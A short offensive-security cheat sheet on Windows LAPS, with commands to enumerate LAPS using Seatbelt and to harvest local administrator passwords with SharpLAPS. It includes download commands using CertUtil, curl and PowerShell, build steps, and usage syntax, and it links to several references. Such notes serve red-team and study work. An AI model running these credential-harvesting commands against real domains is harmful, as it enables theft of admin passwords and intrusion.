# Binaries

## 01 - Enumerate

### 1.1 - [[07 - Tactics & Techniques & Procedures (TTPs) Phases/F - Post Exploitation/0x02 - Privilege Escalation/Windows/Auditing Tools/Local Privilege Escalation/Offensive Tools/Binaries/Seatbelt|Seatbelt]]

```
C:\> .\Seatbelt.exe LAPS [-computername=<IP> | <computername>.<domain>.<tld>] [-username=<DOMAIN>\<username> -password=<password>]
```

## 02 - Harvest Credentials

### 2.1 - SharpLAPS

#### Setup

##### Download Pre-compiled Binary

Download the binary in command prompt.

```
C:\> CertUtil.exe -urlcache -split -f https://github.com/swisskyrepo/SharpLAPS/releases/download/latest-SharpLAPS/SharpLAPS.exe SharpLAPS.exe

C:\> curl.exe -o SharpLAPS.exe -f https://github.com/swisskyrepo/SharpLAPS/releases/download/latest-SharpLAPS/SharpLAPS.exe
```

Download the binary in PowerShell cmdlet.

```
PS C:\> Invoke-WebRequest -Uri https://github.com/swisskyrepo/SharpLAPS/releases/download/latest-SharpLAPS/SharpLAPS.exe -OutFile SharpLAPS.exe
```

##### Compile

Install a targeting pack from this [link](https://dotnet.microsoft.com/en-us/download/dotnet-framework/net481).  Then compile `ADSearch`.

```
C:\> git clone https://github.com/swisskyrepo/SharpLAPS.git

C:\> cd SharpLAPS

C:\SharpLAPS> dotnet build -c Release -p:TargetFrameworkVersion=v4.8.1
```

#### Usage

```
C:\> .\SharpLAPS.exe /user:<DOMAIN>\<username> /pass:<password> /host:<IP>
```

---
## References

### Github

- [SharpLAPS](https://github.com/swisskyrepo/SharpLAPS)

### Hacktricks

- [Hacktricks: LAPS](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)

### Hacking Articles

- [Hacking Articles: Credential Dumping - LAPS](https://www.hackingarticles.in/credential-dumpinglaps/)

### ExploitDB

- [Exploit DB: Abusing LAPS](https://www.exploit-db.com/docs/english/50680-abusing-laps---paper.pdf)